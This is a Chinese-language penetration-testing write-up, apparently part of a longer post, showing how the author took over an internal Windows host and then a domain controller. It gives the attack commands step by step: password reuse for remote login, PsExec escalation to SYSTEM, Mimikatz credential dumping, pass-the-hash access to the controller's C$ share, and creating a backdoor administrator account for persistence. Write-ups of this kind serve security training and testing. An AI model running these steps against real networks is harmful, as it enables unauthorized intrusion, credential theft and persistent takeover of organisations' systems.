## **拿下域内主机**

**根据我这个渗透时长两年半的个人练习生的经验来判断，内网里的服务器的账号密码有部分可能是相同的。**  
再使用上述管理员账号密码远程连接10.0.1.8

![](../Images/e175d58fa680620c500a574e08f4df58.png)

成功连接

![](../Images/222a0c16d640f257878fcf1a14800256.png)

whoami查看是administrator权限  
ipconfig /all查看有域xx.xx

![](../Images/1972b7bcc524a5f0d3f9b9d6ea90b479.png)

一般DNS服务器就是域控服务器

![](../Images/afd79132c4ea9445e55a924d6320772d.png)

查询域控主机名，遭拒绝，需利用官方工具将账号提升至system权限，再查  
net user /domain

![](../Images/7e453fe8a83f10a8225b3642bfd9d54b.png)

上传官方工具PsExec.exe提权  
PsExec.exe -i -s -d cmd 提升至system权限，获取主机名DC.xx.xx

![](../Images/2ea289d030760b776ff3285b5ff0d892.png)

尝试访问域控主机C盘  
dir \\DC.xx.xx\\c$

![](../Images/fd0e3395cc9b13cd3092769ad15a2f16.png)

是拒绝的，需要工具minikatz，使用哈希传递

## **拿下域控**

将mimikatz添加到桌面并以管理员权限运行  
privilege::debug 提升权限  
log 日志会记录内容  
sekurlsa::logonpasswords 抓取密码

![](../Images/2b1d1b8e0fc9fa277e741ba687e72245.png)

获取

*   
*   
*   

```
user=administratorDomain=xxxNTLM=xxxxxxx
```

将上述值放入下方命令中，完成哈希传递，以后利用这个CMD窗口运行,拥有管理员权限。

*   
*   

```
sekurlsa::pth /user:administrator /domain:"xx.xx"/ntlm:xxxxxxx
```

启动域控主机cmd窗口，成功访问域控主机C盘  
dir \\DC.xx.xx\\c$

![](../Images/916bb51cb729a2ebd523c940af02338c.png)

使用官方工具PsExec.exe，命令如下：  
PsExec.exe \\dc.xx.xx cmd  
进入c:\\  
输入ipconfig， 10.0.1.6为域控ip，此时成功获取域控cmd

![](../Images/07debefc8073df03c2991832a8661a1b.png)

新建账号，直接远程登陆域控主机

*   
*   

```
"net user xxx xxxx /add" //新增账号和对应密码"net localgroup administrators xxxx /add"//提升新增账号的权限至administrators组
```

![](../Images/f6e9b29f58f3a0819e65198b1cff884e.png)

建好账号后，直接登陆域控主机10.0.1.6(DC.xx.xx)，成功拿下域控主机权限

![](../Images/2484bd18581f7e61e8c57ce2f870d9b6.png)

至此已成功拿下三台主机的权限。

![](../Images/3cb21c09492a2573e8b73a03bfd34399.png)
